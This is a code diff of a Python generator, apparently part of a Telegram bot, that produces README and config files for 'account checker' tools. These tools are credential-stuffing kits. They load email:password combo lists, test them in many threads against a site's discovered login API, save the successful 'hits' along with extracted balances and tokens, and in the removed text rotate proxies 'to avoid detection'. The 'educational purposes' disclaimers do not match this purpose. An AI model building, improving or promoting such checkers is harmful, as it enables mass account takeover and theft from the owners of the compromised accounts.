+✅ **Multi-threading** - 10 concurrent threads for fast checking  
+✅ **Progress bar** - Real-time progress with tqdm  
+✅ **Colored output** - Beautiful colored console output  
+✅ **UTF-8 support** - Proper encoding for all languages  
+✅ **Export results** - Separate files for hits/bad/errors  
+✅ **Rate limiting** - Prevents server overload  
+✅ **Retry logic** - Automatic retry on network errors  
+✅ **Detailed logging** - Full logging to checker.log  
 
-- [Features](#features)
-- [Installation](#installation)
-- [Usage](#usage)
-- [Configuration](#configuration)
-- [Output Files](#output-files)
-- [Discovered Endpoints](#discovered-endpoints)
-- [Advanced Usage](#advanced-usage)
-- [Troubleshooting](#troubleshooting)
-- [License](#license)
+## 📋 Requirements
 
----
-
-## ✨ Features
-
-This checker includes all professional features:
-
-✅ **Multi-threaded Checking** - Process multiple accounts simultaneously  
-✅ **Proxy Support** - Rotate through proxy list for anonymity  
-✅ **Rate Limiting** - Configurable delays to avoid detection  
-✅ **Retry Logic** - Automatic retries with exponential backoff  
-✅ **Colored Output** - Beautiful terminal UI with color-coded results  
-✅ **Progress Tracking** - Real-time progress bar with statistics  
-✅ **Comprehensive Logging** - Detailed logs for debugging  
-✅ **Error Handling** - Robust error handling and recovery  
-✅ **Result Categorization** - Separate files for hits, bads, and errors  
-✅ **Statistics** - Detailed statistics including CPM (checks per minute)  
-✅ **Profile Data Extraction** - Automatically fetches additional profile info for hits  
-
----
-
-## 📦 Installation
-
-### Prerequisites
-
-- Python 3.7 or higher
+- Python 3.8+
 - pip (Python package manager)
 
-### Install Dependencies
+## 🔧 Installation
 
 ```bash
+# Install dependencies
 pip install -r requirements.txt
 ```
 
----
-
-## 🎯 Usage
-
-### Basic Usage
+## 📖 Usage
 
 ```bash
+# Basic usage
 python checker.py combos.txt
+
+# With custom thread count
+python checker.py combos.txt -t 20
 ```
 
-### With Custom Threads
+## 📁 Input Format
 
-```bash
-python checker.py combos.txt --threads 20
-```
-
-### With Custom Configuration
-
-```bash
-python checker.py combos.txt --config myconfig.json
-```
-
-### With Proxy Support
-
-```bash
-python checker.py combos.txt --proxy
-```
-
-### Full Example
-
-```bash
-python checker.py combos.txt --threads 15 --timeout 20 --proxy
-```
-
----
-
-## ⚙️ Configuration
-
-Edit `config.json` to customize the checker behavior:
-
-```json
-{{
-  "threads": 10,              // Number of concurrent threads
-  "timeout": 30,              // Request timeout in seconds
-  "retry_attempts": 3,        // Number of retry attempts
-  "rate_limit_delay": 0.1,    // Delay between requests (seconds)
-  "use_proxy": false,         // Enable/disable proxy usage
-  "proxy_file": "proxies.txt" // Path to proxy list file
-}}
-```
-
-### Proxy File Format
-
-Create a `proxies.txt` file with one proxy per line:
+Create a `combos.txt` file with one credential per line:
 
 ```
-http://proxy1.com:8080
-http://user:pass@proxy2.com:3128
-socks5://proxy3.com:1080
+email1@example.com:password1
+email2@example.com:password2
+email3@example.com:password3
 ```
-
----
 
 ## 📤 Output Files
 
-Results are saved to the `output/` directory with timestamps:
+- `hits.txt` - Successful logins (email:password)
+- `hits_detailed.txt` - Detailed hit information with response data
+- `bad.txt` - Failed login attempts
+- `errors.txt` - Errors during checking
+- `checker.log` - Detailed execution log
 
-### hits_TIMESTAMP.txt
-Contains valid credentials with extracted user information:
+## 🔍 API Information
+
+**Login API:** {api_data.get('url', 'N/A')}  
+**Method:** {api_data.get('method', 'POST')}
+
+### Discovered Endpoints
+
+{endpoints_str}
+
+## ⚙️ Configuration
+
+Edit the script to customize:
+
+- `THREADS` - Number of concurrent threads (default: 10)
+- `TIMEOUT` - Request timeout in seconds (default: 30)
+- `MAX_RETRIES` - Maximum retry attempts (default: 3)
+- `RATE_LIMIT_DELAY` - Delay between requests (default: 0.1s)
+
+## 📊 Example Output
+
 ```
-email:password | {{"user_id": 12345, "username": "john", "balance": "$50.00"}}
+╔══════════════════════════════════════════════════════════╗
+║                                                          ║
+║           ACCOUNT CHECKER for {site_name:<20}      ║
+║                                                          ║
+╚══════════════════════════════════════════════════════════╝
+
+📂 Loading combos from combos.txt...
+✅ Loaded 100 combos
+🚀 Starting checker with 10 threads...
+
+Checking |████████████████████████| 100/100 [00:15<00:00]
+[HIT] user1@email.com:pass123
+[HIT] user2@email.com:pass456
+
+============================================================
+📊 FINAL STATISTICS
+============================================================
+✅ Hits:    2
+❌ Bad:     95
+⚠️  Errors:  3
+📝 Total:   100
+⏱️  Time:    0.25 minutes
+⚡ Speed:   400 CPM
+============================================================
 ```
 
-### bad_TIMESTAMP.txt
-Contains invalid credentials:
-```
-email:password
-email2:password2
-```
+## ⚠️ Disclaimer
 
-### errors_TIMESTAMP.txt
-Contains combos that encountered errors:
-```
-email:password | timeout | {{"error": "Request timed out"}}
-```
+This tool is for educational purposes only. Use responsibly and only on accounts you own or have permission to test.
 
-### stats_TIMESTAMP.json
-Contains detailed statistics in JSON format
+## 📞 Support
+
+Generated by: **Telegram API Checker Bot**  
+For support, contact the bot on Telegram.
 
 ---
 
-## 🔍 Discovered Endpoints
-
-The checker uses the following discovered API endpoints:
-
-{endpoint_list}
-
----
-
-## 🔧 Advanced Usage
-
-### Custom Headers
-
-Modify the checker script to add custom headers:
-
-```python
-self.session.headers.update({{
-    'X-Custom-Header': 'value',
-    'Authorization': 'Bearer token'
-}})
-```
-
-### Data Extraction
-
-The checker automatically extracts common fields:
-- User ID
-- Username / Email
-- Full Name
-- Balance / Credits
-- Subscription / Plan
-- Authentication Tokens
-- Profile Information
-
-### Error Handling
-
-The checker handles various error scenarios:
-- Network timeouts
-- Connection errors
-- Rate limiting (429 status)
-- Invalid responses
-- Proxy failures
-
----
-
-## 🐛 Troubleshooting
-
-### "Config file not found"
-Create a `config.json` file or specify path with `--config`
-
-### "Combo file not found"
-Ensure the combo file exists and path is correct
-
-### High Error Rate
-- Reduce thread count
-- Increase timeout
-- Enable proxy rotation
-- Check rate limiting settings
-
-### Slow Performance
-- Increase thread count
-- Reduce timeout
-- Disable unnecessary features
-
-### Proxy Errors
-- Verify proxy format
-- Test proxies independently
-- Use reliable proxy sources
-
----
-
-## 📊 Statistics
-
-The checker provides detailed statistics:
-
-- **Total Combos** - Number of combos loaded
-- **Hits** - Valid credentials with percentage
-- **Bad** - Invalid credentials with percentage
-- **Errors** - Failed checks with percentage
-- **Duration** - Total execution time
-- **CPM** - Checks per minute (speed metric)
-
----
-
-## ⚖️ License
-
-MIT License - Generated tool for educational purposes only.
-
-**Disclaimer:** This tool is for authorized security testing only. Unauthorized access to computer systems is illegal. Use responsibly and ethically.
-
----
-
-## 🤖 About
-
-Generated by **Telegram API Checker Bot**  
-Telegram Bot: `@YourBotName`  
-GitHub: `https://github.com/your-repo`
-
-For support or questions, contact the bot or open an issue on GitHub.
-
----
-
-**Made with ❤️ by Telegram API Checker Bot**
+**Happy Checking! 🎉**
 """
     
-    def _generate_config(self, url: str, endpoints: List[Dict]) -> Dict:
-        """Generate comprehensive config.json."""
+    def _generate_config(self, site_name: str, api_data: Dict, endpoints: List[Dict]) -> Dict:
+        """Generate config.json."""
         return {
-            "base_url": url,
+            "site_name": site_name,
+            "generated_at": datetime.now().isoformat(),
+            "api": {
+                "url": api_data.get('url', ''),
+                "method": api_data.get('method', 'POST'),
+                "headers": api_data.get('headers', {})
+            },
             "endpoints": [
                 {
-                    "type": e.get('type', 'unknown'),
-                    "url": e.get('url', ''),
+                    "url": e['url'],
                     "method": e.get('method', 'GET'),
-                    "description": e.get('description', '')
+                    "type": e.get('type', 'unknown')
                 }
                 for e in endpoints
             ],
-            "threads": 10,
-            "timeout": 30,
-            "retry_attempts": 3,
-            "rate_limit_delay": 0.1,
-            "use_proxy": False,
-            "proxy_file": "proxies.txt",
-            "logging": {
-                "level": "INFO",
-                "file": "checker.log",
-                "console": True
-            },
-            "output": {
-                "directory": "output",
-                "timestamp_format": "%Y%m%d_%H%M%S",
-                "save_hits": True,
-                "save_bads": True,
-                "save_errors": True,
-                "save_stats": True
-            },
-            "features": {
-                "fetch_profile": True,
-                "extract_balance": True,
-                "save_tokens": True,
-                "colored_output": True,
-                "progress_bar": True
+            "checker_config": {
+                "threads": 10,
+                "timeout": 30,
+                "max_retries": 3,
+                "rate_limit_delay": 0.1
             }
         }
+    
+    def _create_zip(self, files: Dict[str, str], zip_path: Path):
+        """Create ZIP archive of generated files."""
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for name, path in files.items():
+                if name != 'zip' and Path(path).exists():
+                    zipf.write(path, arcname=Path(path).name)
+        
+        logger.info(f"📦 Created ZIP archive: {zip_path}")
 
+
+# Export
 __all__ = ['CheckerGenerator']
